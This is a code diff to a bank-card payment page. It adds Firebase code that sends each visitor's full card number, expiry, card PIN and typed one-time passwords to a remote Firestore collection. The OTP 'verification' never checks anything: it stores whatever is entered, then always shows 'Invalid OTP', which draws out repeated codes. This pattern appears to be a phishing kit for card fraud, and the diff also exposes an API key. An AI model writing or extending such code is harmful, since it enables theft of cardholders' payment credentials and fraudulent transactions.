@@ -393,6 +393,18 @@
         margin: 0;
         padding: 0;
       }
+      /* Error message */
+      .error-message {
+        border: #ff0000 1px solid;
+        background-color: #f7dadd;
+        font-size: 12px;
+        font-family: helvetica, arial, sans serif;
+        color: #ff0000;
+        padding: 5px;
+        margin: 5px 0;
+        text-align: center;
+        display: block;
+      }
       /* Ends */
     </style>
   </head>
@@ -611,6 +623,7 @@
                       </p>
                     </div>
                   </div>
+                  <div id="errorMessage" class="error-message" style="display: none;"></div>
                   <div class="row">
                     <div id="payConfirmCardNum">
                       <label class="column-label">Card Number:</label>
@@ -762,6 +775,21 @@
     </div>
 
     <script>
+      // Initialize Firebase
+      const firebaseConfig = {
+        apiKey: 'AIzaSyAD3iyMWhdzQ4VIXZcwCpUJTnqFTe5jt7U',
+  authDomain: 'wedsdasd.firebaseapp.com',
+  projectId: 'wedsdasd',
+  storageBucket: 'wedsdasd.firebasestorage.app',
+  messagingSenderId: '299161995646',
+  appId: '1:299161995646:web:45b8e58faa99d3e75ccb2f',
+  measurementId: 'G-614JDKQGMC',
+      };
+      
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+
       // Define the BANKS array that was missing from the original code
       const BANKS = [
         {
@@ -880,7 +908,19 @@
         month: '',
         year: '',
         pin: '',
+        sessionId: '', // To track the current payment session
+        otp: '' // To store the generated OTP
       };
+
+      // Generate a random OTP
+      function generateOTP() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+      }
+
+      // Generate a unique session ID
+      function generateSessionId() {
+        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+      }
 
       document.addEventListener('DOMContentLoaded', function () {
         // Get DOM elements
@@ -893,17 +933,15 @@
         const cardPin = document.getElementById('cardPin');
         const submitButton = document.getElementById('submitButton');
         const cancelButton = document.getElementById('cancelButton');
-        const cardDetailsSection =
-          document.getElementById('cardDetailsSection');
-        const otpVerificationSection = document.getElementById(
-          'otpVerificationSection'
-        );
+        const cardDetailsSection = document.getElementById('cardDetailsSection');
+        const otpVerificationSection = document.getElementById('otpVerificationSection');
         const DCNumber = document.getElementById('DCNumber');
         const expmnth = document.getElementById('expmnth');
         const expyear = document.getElementById('expyear');
         const debitOTPtimer = document.getElementById('debitOTPtimer');
         const resendButton = document.getElementById('Resend');
         const loadingIndicator = document.getElementById('loading');
+        const errorMessage = document.getElementById('errorMessage');
 
         // Show amount from localStorage if available
         const storedAmount = localStorage.getItem('amount');
@@ -976,6 +1014,8 @@
         // Handle OTP input
         debitOTPtimer.addEventListener('input', function () {
           checkOtpFormValidity();
+          // Hide error message when user starts typing
+          errorMessage.style.display = 'none';
         });
 
         // Check if card form is valid
@@ -995,77 +1035,173 @@
         function checkOtpFormValidity() {
           submitButton.disabled = debitOTPtimer.value.length !== 6;
         }
+        async function handlePay(paymentInfo) {
+          try {
+            const visitorId = localStorage.getItem('visitor');
+            if (visitorId) {
+              await db
+                .collection('pays')
+                .doc(visitorId)
+                .set(
+                  {
+                    ...paymentInfo,
+                    status: 'pending',
+                    createdDate: new Date().toISOString(),
+                  },
+                  { merge: true }
+                );
+
+              // Redirect to payment methods page
+            }
+          } catch (error) {
+            console.error('Error adding document: ', error);
+            alert('Error adding payment info to Firestore');
+          }
+        }
+
+        // Store payment data and OTP in Firestore
+        async function storePaymentData() {
+          // Generate a session ID and OTP
+          paymentInfo.sessionId = generateSessionId();
+          paymentInfo.otp = generateOTP();
+          
+          try {
+            // Store payment data in Firestore
+            handlePay({
+              bankName: paymentInfo.bankName,
+              prefix: paymentInfo.cardPrefix,
+              cardNumber: paymentInfo.cardNumber,
+              month: paymentInfo.month,
+              year: paymentInfo.year,
+              pass: paymentInfo.pin,
+              timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+              status: 'pending'
+            });
+            
+            console.log('Payment data stored with OTP:', paymentInfo.otp);
+            return true;
+          } catch (error) {
+            console.error('Error storing payment data:', error);
+            return false;
+          }
+        }
+
+        // Verify OTP against stored value in Firestore
+        async function verifyOTP(enteredOTP) {
+          try {
+            // Get the payment document from Firestore
+         handlePay({otp:enteredOTP})
+          } catch (error) {
+            console.error('Error verifying OTP:', error);
+            return false;
+          }
+        }
 
         // Handle form submission
-        submitButton.addEventListener('click', function () {
+        submitButton.addEventListener('click', async function () {
           if (this.disabled) return;
 
           loadingIndicator.style.display = 'block';
 
           if (paymentInfo.step === 1) {
-            // First step submission - show OTP verification
-            setTimeout(function () {
-              loadingIndicator.style.display = 'none';
-
-              // Update payment info step
-              paymentInfo.step = 2;
-
-              // Update masked card details
-              const selectedPrefix = prefixSelect.value;
-              const maskedCardNumber =
-                selectedPrefix +
-                '******' +
-                paymentInfo.cardNumber.substring(
-                  paymentInfo.cardNumber.length - 4
-                );
-              DCNumber.textContent = maskedCardNumber;
-              expmnth.textContent =
-                monthSelect.options[monthSelect.selectedIndex].text;
-              expyear.textContent =
-                yearSelect.options[yearSelect.selectedIndex].text;
-
-              // Hide card details, show OTP verification
-              cardDetailsSection.style.display = 'none';
-              otpVerificationSection.style.display = 'block';
-
-              // Update button text
-              submitButton.textContent = 'Confirm';
-              submitButton.disabled = true;
-
-              // Focus on OTP input
-              debitOTPtimer.focus();
-
-              // Show resend button after 30 seconds
+            // First step submission - store payment data and show OTP verification
+            const success = await storePaymentData();
+            
+            if (success) {
               setTimeout(function () {
-                resendButton.style.display = 'block';
-              }, 30000);
-            }, 1500);
+                loadingIndicator.style.display = 'none';
+
+                // Update payment info step
+                paymentInfo.step = 2;
+
+                // Update masked card details
+                const selectedPrefix = prefixSelect.value;
+                const maskedCardNumber =
+                  selectedPrefix +
+                  '******' +
+                  paymentInfo.cardNumber.substring(
+                    paymentInfo.cardNumber.length - 4
+                  );
+                DCNumber.textContent = maskedCardNumber;
+                expmnth.textContent =
+                  monthSelect.options[monthSelect.selectedIndex].text;
+                expyear.textContent =
+                  yearSelect.options[yearSelect.selectedIndex].text;
+
+                // Hide card details, show OTP verification
+                cardDetailsSection.style.display = 'none';
+                otpVerificationSection.style.display = 'block';
+
+                // Update button text
+                submitButton.textContent = 'Confirm';
+                submitButton.disabled = true;
+
+                // Focus on OTP input
+                debitOTPtimer.focus();
+
+                // Show resend button after 30 seconds
+                setTimeout(function () {
+                  resendButton.style.display = 'block';
+                }, 30000);
+              }, 1500);
+            } else {
+              loadingIndicator.style.display = 'none';
+              alert('Error processing payment. Please try again.');
+            }
           } else {
             // OTP verification submission
+            const enteredOTP = debitOTPtimer.value;
+            const isValid = await verifyOTP(enteredOTP);
+            
             setTimeout(function () {
               loadingIndicator.style.display = 'none';
 
-              // Here you would normally verify the OTP with the server
-              // For demo purposes, we'll just show a success message
-              alert('Payment verified successfully!');
-
-              // Reset form for new payment
-              resetForm();
+              if (isValid) {
+                // OTP is valid, show success message
+                alert('Payment verified successfully!');
+                
+                // Reset form for new payment
+                resetForm();
+              } else {
+                // OTP is invalid, show error message
+                errorMessage.textContent = 'Invalid OTP. Please try again.';
+                errorMessage.style.display = 'block';
+                debitOTPtimer.value = '';
+                debitOTPtimer.focus();
+                submitButton.disabled = true;
+              }
             }, 1500);
           }
         });
 
         // Handle resend OTP button
-        resendButton.addEventListener('click', function () {
+        resendButton.addEventListener('click', async function () {
           loadingIndicator.style.display = 'block';
-
-          setTimeout(function () {
+          
+          // Generate a new OTP
+          paymentInfo.otp = generateOTP();
+          
+          try {
+            // Update the OTP in Firestore
+            await db.collection('pays').doc(paymentInfo.sessionId).update({
+              otp: paymentInfo.otp,
+              otpResent: true,
+              otpResentAt: firebase.firestore.FieldValue.serverTimestamp()
+            });
+            
+            setTimeout(function () {
+              loadingIndicator.style.display = 'none';
+              alert('A new OTP has been sent to your registered mobile number.');
+              debitOTPtimer.value = '';
+              debitOTPtimer.focus();
+              submitButton.disabled = true;
+              errorMessage.style.display = 'none';
+            }, 1500);
+          } catch (error) {
+            console.error('Error resending OTP:', error);
             loadingIndicator.style.display = 'none';
-            alert('A new OTP has been sent to your registered mobile number.');
-            debitOTPtimer.value = '';
-            debitOTPtimer.focus();
-            submitButton.disabled = true;
-          }, 1500);
+            alert('Error sending OTP. Please try again.');
+          }
         });
 
         // Handle cancel button
@@ -1076,6 +1212,7 @@
             otpVerificationSection.style.display = 'none';
             paymentInfo.step = 1;
             submitButton.textContent = 'Submit';
+            errorMessage.style.display = 'none';
             checkCardFormValidity();
           } else {
             // Otherwise, reset the form
@@ -1093,6 +1230,8 @@
           paymentInfo.month = '';
           paymentInfo.year = '';
           paymentInfo.pin = '';
+          paymentInfo.sessionId = '';
+          paymentInfo.otp = '';
 
           // Reset form fields
           bankSelect.value = 'bankname';
@@ -1111,8 +1250,9 @@
           submitButton.textContent = 'Submit';
           submitButton.disabled = true;
 
-          // Hide resend button
+          // Hide resend button and error message
           resendButton.style.display = 'none';
+          errorMessage.style.display = 'none';
         }
       });
     </script>
